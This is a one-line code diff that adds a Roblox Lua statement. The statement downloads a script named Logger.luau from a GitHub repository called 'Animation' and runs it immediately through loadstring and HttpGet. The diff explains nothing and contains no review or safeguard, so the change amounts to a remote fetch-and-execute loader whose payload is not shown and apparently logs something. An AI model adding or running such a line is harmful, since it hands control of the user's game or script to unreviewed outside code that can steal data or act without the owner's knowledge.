@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FlamesW/Animation/refs/heads/home/Logger.luau"))()
